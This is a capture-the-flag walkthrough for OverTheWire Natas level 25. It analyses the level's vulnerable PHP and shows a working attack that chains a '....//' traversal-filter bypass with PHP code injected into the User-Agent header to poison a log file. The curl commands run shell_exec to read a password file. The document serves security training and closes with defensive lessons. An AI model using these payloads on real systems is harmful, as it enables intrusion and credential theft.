> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas25.natas.labs.overthewire.org`                  |
| Username | `natas25`                                                    |
| Password | *found in [Natas Level 23 → 24](natas-level-23-level-24.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own PHP source
- **Burp Suite** — to intercept requests and modify the `User-Agent` header
- **`curl`** — to send a poisoned User-Agent and fetch the log in one chain

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas25.natas.labs.overthewire.org` and log in with the password from Level 24.

The page displays a quote in English with a language selector dropdown. Selecting a different language reloads the page with a `?lang=` parameter in the URL — for example, `?lang=de`. There is also a **View sourcecode** link. Click it.

---

### Step 2 — Read the Source Code

```php
<?php
// cheers and <3 to malvina  
// - morla
function setLanguage(){
	/* language setup */
    if(array_key_exists("lang",$_REQUEST))
        if(safeinclude("language/" . $_REQUEST["lang"]))
            return 1;
    safeinclude("language/en");
}

function safeinclude($filename){
    // check for directory traversal
    if(strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
    }
    // dont let ppl steal our passwords
    if(strstr($filename,"natas_webpass")){
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }
    // add more checks...

    if (file_exists($filename)) {
        include($filename);
        return 1;
    }
    return 0;
}

function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n";
    $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}

session_start();
setLanguage();
?>
```

Walking through each function:

**`setLanguage()`:** Takes the `lang` GET/POST parameter and passes it directly into `safeinclude()`, prepended with `"language/"`. If no `lang` is given, it defaults to English. The user-supplied value becomes part of a file path with only the filtering inside `safeinclude()` standing between it and `include()`.

**`safeinclude()`:** Two filters and one file inclusion:

```php
if(strstr($filename,"../")){
    logRequest("Directory traversal attempt! fixing request.");
    $filename=str_replace("../","",$filename);
}
```

Detects `../` in the path and removes every occurrence with `str_replace()`. The intent is to prevent directory traversal. The flaw: `str_replace()` is **not recursive**, it makes one pass and stops. It replaces every literal `../` it finds, but it does not re-scan the result. If the input is `....//`, after removing the inner `../` the remaining characters are `../`, a valid traversal sequence the filter never saw. This is a well-known bypass for non-recursive `str_replace` traversal filters.

```php
if(strstr($filename,"natas_webpass")){
    logRequest("Illegal file access detected! Aborting!");
    exit(-1);
}
```

	Detects the string `natas_webpass` anywhere in the path and calls `exit(-1)`. This blocks direct LFI to the password file. Crucially, it calls `logRequest()` first, and then exits `-1`. This ordering matters: the log entry is written before execution stops.

```php
if (file_exists($filename)) {
    include($filename);
    return 1;
}
```

PHP's `include()` executes any PHP code inside the included file. If we can reach a file we control, any PHP embedded in it runs on the server.

**`logRequest()`:** Writes a log entry to a per-session file:

```php
$fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
```

The log entry contains three fields:

```
[timestamp] <User-Agent value> "<log message>"
```

The `User-Agent` is taken from `$_SERVER['HTTP_USER_AGENT']` and written into the log **without any sanitization or escaping**.

**The `session_start()` ordering problem.** Looking at the full page source, `session_start()` is called in the HTML body, _after_ `setLanguage()` is called. `logRequest()` uses `session_id()` to name the log file. If `session_start()` has not yet been called when `logRequest()` runs, `session_id()` returns an empty string and the log is written to `/var/www/natas/natas25/logs/natas25_.log` — no session ID in the filename at all.

The fix is to send the `PHPSESSID` cookie explicitly with every request. When PHP receives a `PHPSESSID` cookie, `session_id()` returns its value even before `session_start()` is called explicitly in the script. This means the log filename is determined by the cookie you send, not by whatever session the page eventually starts. You control the session ID → you know the log path.

These two weaknesses combine into the attack:

1. **Filter bypass**, reach the log file using `....//` sequences
2. **Log poisoning via User-Agent**, write PHP code into the log by injecting it through the `User-Agent` header

---

### Understand the Two-Stage Attack

**Stage 1 — Poison the log.**

Send any request that triggers `logRequest()`. The `../` check triggers it when a traversal attempt is detected. Submit `lang=../` or `lang=natas_webpass`, either causes `logRequest()` to run. In that request, set the `User-Agent` header to PHP code:

```
<?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>
```

This string gets written verbatim into the log file at:

```
/var/www/natas/natas25/logs/natas25_<PHPSESSID>.log
```

**Stage 2 — Include the log.**

Send a second request using the traversal filter bypass to reach the log file. Starting from the hardcoded prefix `"language/"`, navigate up to the filesystem root and back down to the log path. Five levels up from `language/` reaches `/`, so the bypass payload is:

```
....//....//....//....//....//var/www/natas/natas25/logs/natas25_<PHPSESSID>.log
```

After `str_replace("../", "", ...)` processes this — removing each inner `../` — what remains is:

```
language/../../../../../var/www/natas/natas25/logs/natas25_<PHPSESSID>.log
```

Which resolves to the log file. PHP `include()`s it, executes the poisoned PHP inside, and the password is printed into the page.

---

### Step 3 — Get Your Session ID

Make one plain GET request to the page to establish a session, then read the assigned `PHPSESSID`:

```bash
curl -u natas25:<password> \
     -c cookies.txt \
     "http://natas25.natas.labs.overthewire.org/index.php"
```

```bash
cat cookies.txt
```

The last field on the `PHPSESSID` line is your session ID — a string of lowercase letters and digits. Copy it. Every subsequent request must send this exact value in the `PHPSESSID` cookie, both to poison the log and to include it.

**Why this matters:** because `session_start()` is called after `setLanguage()` in the page, `session_id()` inside `logRequest()` reads the session ID from the inbound `PHPSESSID` cookie directly rather than from a started session. If you omit the cookie, `session_id()` returns an empty string and the log is written to `natas25_.log` a file you cannot find by inspecting your cookie. Sending your own `PHPSESSID` on every request ensures the log lands at a path you already know.

---

### Step 4 — Poison the Log

Use `curl` to send a request that triggers `logRequest()` with PHP code in the `User-Agent`:

```bash
curl -u natas25:<password> \
     -H 'User-Agent: <?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>' \
     -b 'PHPSESSID=<your session ID>' \
     "http://natas25.natas.labs.overthewire.org/index.php?lang=natas_webpass"
```

|Flag / argument|Meaning|
|---|---|
|`-u natas25:<password>`|HTTP Basic Authentication|
|`-H 'User-Agent: ...'`|Replaces the default User-Agent with PHP code|
|`-b 'PHPSESSID=...'`|Sends the same session cookie used by your browser, ensuring the poison lands in the right log file|
|`?lang=natas_webpass`|Triggers the `natas_webpass` check → calls `logRequest()` → writes the poisoned User-Agent into the log → then `exit(-1)`|

The server exits immediately, but not before writing the log entry. The log file at `/var/www/natas/natas25/logs/natas25_<PHPSESSID>.log` now contains:

```
[23.05.2026 12::00:00] <?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?> "Illegal file access detected! Aborting!"
```

---

### Step 5 — Include the Log via LFI

Now send the LFI request. Use the `....//` bypass to traverse out of `language/` and reach the log file:

```bash
curl -u natas25:<password> \
     -b 'PHPSESSID=<your session ID>' \
     "http://natas25.natas.labs.overthewire.org/index.php?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_<your session ID>.log"
```

The server processes `safeinclude("language/....//....//....//....//....//var/www/natas/natas25/logs/natas25_<PHPSESSID>.log")`:

1. `strstr($filename,"../")` detects `../` inside each `....//`
2. `str_replace("../","",...)` removes each inner `../`, leaving valid traversal sequences
3. The `natas_webpass` check does not trigger — the path contains no such string
4. `include()` processes the log file and executes the embedded PHP

The response contains the page HTML with the password interpolated into it where the PHP executed:

```
<password>
```

That is the password for [Natas Level 25 → 26](natas-level-25-level-26.md).

---

## Key Takeaways

- **`str_replace()` traversal filters are not recursive.** Replacing `../` with `""` in a single pass is bypassable with `....//`. After the replacement removes the inner `../`, the surrounding characters collapse into a new `../` that the function already finished scanning. A correct fix either uses a loop until the string stabilises, or — better — uses `realpath()` to resolve the path and checks it against a whitelist of allowed prefixes.
- **Log poisoning turns a write primitive into code execution.** Any log that records unsanitised user-controlled input (headers, parameters, cookies) and is later `include()`d or `require()`d by PHP is a code execution vector. The `User-Agent` header is particularly common because it is rarely validated and almost always logged. Sanitise everything written to files that may later be included, or — more fundamentally — never `include()` files that are in any way derived from user input.
- **The filter and the logger work against each other.** `safeinclude()` calls `logRequest()` on every filter violation before either fixing or aborting. This means the User-Agent is written to disk during the very requests that are supposed to be blocked. The defensive action (logging the violation) creates the attacker's write primitive. The ordering of security-relevant operations matters.
- **Predictable log paths based on session IDs are not secrets.** The session ID is readable from the client's own cookie. A log path derived from it is known to the attacker. Storing logs in a web-accessible directory at a predictable path compounds the LFI risk.
---